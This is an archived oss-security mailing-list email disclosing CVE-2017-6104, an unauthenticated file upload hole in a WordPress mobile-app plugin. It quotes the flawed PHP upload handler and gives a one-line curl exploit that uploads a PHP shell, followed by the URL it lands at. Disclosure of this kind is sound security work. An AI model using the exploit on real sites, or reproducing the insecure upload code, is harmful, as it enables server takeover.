X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1686" "Thursday" "2" "March" "2017" "13:52:23" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<798D4367-AFCB-43FF-A603-F296E7E38ECE@me.com>" "43" "[oss-security] Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0" nil nil nil "3" "2017030218:52:23" "[oss-security] Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0" (number mark "U       larry0@me.co Mar  2   43/1686  " thread-indent "\"[oss-security] Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5231 invoked by uid 550); 2 Mar 2017 18:52:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5200 invoked from network); 2 Mar 2017 18:52:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1488480745; bh=b3OiwPH6O5ZknisBFc/MlSvZ3NQiz8AfQlono07vIh8=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=ml+jdKyOPKLoYfhjd3FlcjW3zh4Ww/nEgPrN3ox8s0vLK81rmVe+500jo4tZ07pWn
 WtQOvy2dLMETfhmIpZR7svdc77RA1N668M59NXASD6v555U4/LuocPinBuQMUrw213
 USOaVO+C2P9ZnuYx1c/B3Jj8ruzgfbMI2ulnk4LzeppRV/CpNFFGwRmYeY/CPrtWnz
 KkxOMX5iiro7XvfbhdZBEcpYmhzmTNUdoRfmoi2ORvRV9ttMu+VnjDBd8wGQd+MN9I
 WlItfQCRsnxoVHhDxY8eKSP9FS18M/h4fl/heUrgHC4ncrpiY0G9cAkUntXIta0fTt
 PJSrbljRYdlHw==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-02_17:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703020163
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=us-ascii
Content-transfer-encoding: quoted-printable
Message-id: <798D4367-AFCB-43FF-A603-F296E7E38ECE@me.com>
Date: Thu, 02 Mar 2017 13:52:23 -0500
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Remote file upload vulnerability in Wordpress Plugin Mobile App Native
 3.0

Title: Remote file upload vulnerability in Wordpress Plugin Mobile App Nati=
ve 3.0
Author: Larry W. Cashdollar, @_larry0
Date: 2017-02-27
Download Site: https://wordpress.org/plugins/zen-mobile-app-native/
Vendor: https://profiles.wordpress.org/zendkmobileapp/
Vendor Notified: 2017-02-27
Vendor Contact:
Description: Mobile App WordPress plugin lets you turn your website into a =
full-featured mobile application in minutes using Mobile App Builder.
Vulnerability:
The code in file ./zen-mobile-app-native/server/images.php doesn't require =
authentication or check that the user is allowed to upload content.
It also doesn't sanitize the file upload against executable code.

<?php
//header('content-type: text/html; charset=3Diso-8859-2');
header('Content-Type: text/html; charset=3Dutf-8');
header('Access-Control-Allow-Origin: *');
require_once('function.php');

if ($_FILES['file']['name']) {
if (!$_FILES['file']['error']) {
$name =3D md5(rand(100, 200));
$ext =3D explode('.', $_FILES['file']['name']);
$filename =3D $name . '.' . $ext[1];
$destination =3D 'images/' . $filename;
$location =3D $_FILES["file"]["tmp_name"];
move_uploaded_file($location, $destination);
echo $plugin_url.'/server/images/' . $filename;
}
else {
echo $message =3D 'Ooops! Your upload triggered the following error: '.$_FI=
LES['file']['error'];
}
}
CVE-ID: CVE-2017-6104
Exploit Code:
$ curl -F "file=3D@/var/www/shell.php" "http://example.com/wordpress/wp-con=
tent/plugins/zen-mobile-app-native/server/images.php"
http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native//serv=
er/images/8d5e957f297893487bd98fa830fa6413.php
Advisory: http://www.vapidlabs.com/advisory.php?v=3D178=
